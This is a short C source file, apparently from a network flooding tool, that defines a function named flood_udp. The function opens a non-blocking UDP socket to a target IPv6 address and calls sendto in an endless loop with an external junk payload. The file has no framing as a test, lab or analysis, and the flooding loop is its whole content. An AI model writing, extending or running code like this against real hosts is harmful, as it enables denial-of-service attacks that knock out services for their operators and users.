#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "main.h"

extern char shit[];

int flood_udp(struct sockaddr_in6 sin) {
  int sock;

  if((sock = socket(sin.sin6_family, SOCK_DGRAM | SOCK_NONBLOCK, IPPROTO_UDP)) == -1 ) {
    perror("Can't create socket\n");
    return EXIT_FAILURE;
  }

  while(sendto(sock, shit, strlen(shit) + 1, MSG_OOB, (struct sockaddr *)&sin, sizeof(sin)));

  return EXIT_SUCCESS;
}
